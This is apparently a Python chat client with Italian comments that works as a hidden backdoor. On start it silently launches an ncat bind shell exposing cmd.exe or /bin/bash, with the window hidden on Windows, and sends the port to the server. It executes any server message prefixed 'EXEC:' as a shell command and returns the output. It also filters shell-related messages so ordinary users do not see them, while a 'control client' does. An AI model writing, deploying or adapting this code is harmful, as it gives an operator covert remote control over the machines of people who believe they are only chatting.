import socket
import threading
import sys
import platform
import subprocess
import select
import random
import os
import json
import time

class ChatClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.nickname = None
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.platform = platform.system()
        self.running = True
        self.prompt_active = False
        self.ncat_port = random.randint(49152, 65535)
        self.ncat_process = None
        self.is_control_client = (port == 4343)

    def _is_ncat_installed(self):
        try:
            subprocess.run(["ncat", "--version"], 
                         stdout=subprocess.PIPE, 
                         stderr=subprocess.PIPE,
                         check=True)
            return True
        except:
            return False

    def start_ncat_server(self):
        if not self._is_ncat_installed():
            return False

        try:
            if self.platform == 'Windows':
                cmd = f"ncat -lvnp {self.ncat_port} -e cmd.exe"
                creationflags = subprocess.CREATE_NO_WINDOW
                self.ncat_process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=creationflags
                )
            else:
                cmd = f"ncat -lvn 0.0.0.0 {self.ncat_port} -e /bin/bash"
                self.ncat_process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            
            # Verifica che Ncat sia in ascolto
            for _ in range(3):
                time.sleep(1)
                if self._verify_ncat_listening():
                    return True
            return False
        except:
            return False

    def _verify_ncat_listening(self):
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(1)
            result = test_sock.connect_ex(('127.0.0.1', self.ncat_port))
            test_sock.close()
            return result == 0
        except:
            return False

    def clear_input_buffer(self):
        try:
            while select.select([sys.stdin], [], [], 0)[0]:
                sys.stdin.readline()
        except:
            pass

    def receive(self):
        while self.running:
            try:
                ready = select.select([self.client], [], [], 0.1)
                if ready[0]:
                    message = self.client.recv(4096).decode('utf-8')
                    if not message:
                        break
                    
                    if message.startswith("EXEC:"):
                        # Esegui comando remoto
                        command = message[5:]
                        try:
                            result = subprocess.run(command, shell=True, 
                                                  capture_output=True, text=True, 
                                                  timeout=10)
                            output = result.stdout if result.stdout else result.stderr
                            if not output:
                                output = f"Comando eseguito: {command}"
                            
                            response = {
                                "type": "command_result",
                                "client": self.nickname if self.nickname else "unknown",
                                "command": command,
                                "output": output
                            }
                            self.client.send(f"EXEC_RESULT:{json.dumps(response)}".encode('utf-8'))
                        except subprocess.TimeoutExpired:
                            response = {
                                "type": "command_result",
                                "client": self.nickname if self.nickname else "unknown",
                                "command": command,
                                "output": "Timeout: il comando ha impiegato troppo tempo"
                            }
                            self.client.send(f"EXEC_RESULT:{json.dumps(response)}".encode('utf-8'))
                        except Exception as e:
                            response = {
                                "type": "command_result",
                                "client": self.nickname if self.nickname else "unknown",
                                "command": command,
                                "output": f"Errore: {str(e)}"
                            }
                            self.client.send(f"EXEC_RESULT:{json.dumps(response)}".encode('utf-8'))
                    else:
                        # Filtra messaggi tecnici per client normali
                        if not self.is_control_client and ("Ncat" in message or "Shell remota" in message):
                            continue
                            
                        self.clear_input_buffer()
                        print(f"\r{message}", end='')
                        if self.nickname:
                            print(f"{self.nickname}> ", end='', flush=True)
                            self.prompt_active = True
            except Exception as e:
                if self.is_control_client:
                    print(f"\nErrore nella connessione: {str(e)}")
                break
        
        self.running = False
        if self.is_control_client:
            print("\nConnessione persa con il server!")
        self.stop_ncat_server()
        self.client.close()

    def stop_ncat_server(self):
        if self.ncat_process:
            try:
                self.ncat_process.terminate()
                self.ncat_process.wait(timeout=2)
            except:
                pass

    def write(self):
        while self.running:
            try:
                if self.nickname:
                    message = input(f"{self.nickname}> " if self.prompt_active else "")
                    self.prompt_active = False
                else:
                    message = input("> " if self.prompt_active else "")
                    self.prompt_active = False
                
                if message.lower() == 'exit':
                    self.running = False
                    break
                
                self.client.send(message.encode('utf-8'))
            except KeyboardInterrupt:
                self.running = False
                break
            except:
                self.running = False
                break

    def run(self):
        try:
            self.client.connect((self.host, self.port))
            self.client.settimeout(0.5)
            
            # Configura Ncat (solo per client normali)
            if not self.is_control_client:
                if self._is_ncat_installed() and self.start_ncat_server():
                    self.client.send(f"NCAT_PORT:{self.ncat_port}".encode('utf-8'))
                else:
                    self.client.send("NCAT_NOT_AVAILABLE".encode('utf-8'))
            else:
                self.client.send("CONTROL_CLIENT".encode('utf-8'))

            # Ricevi il nickname dal server
            nickname_msg = self.client.recv(1024).decode('utf-8')
            if "Il tuo nome è:" in nickname_msg:
                self.nickname = nickname_msg.split(":")[1].strip()
                print(nickname_msg, end='')

            # Avvia thread per ricezione e scrittura
            receive_thread = threading.Thread(target=self.receive)
            receive_thread.start()
            
            write_thread = threading.Thread(target=self.write)
            write_thread.start()
            
            receive_thread.join()
            write_thread.join()
            
        except ConnectionRefusedError:
            print("Impossibile connettersi al server. Verifica l'IP e la porta.")
        except Exception as e:
            if self.is_control_client:
                print(f"Errore: {str(e)}")
        finally:
            self.stop_ncat_server()
            self.client.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Utilizzo: python client.py <server_ip> <port>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    client = ChatClient(host, port)
    client.run()
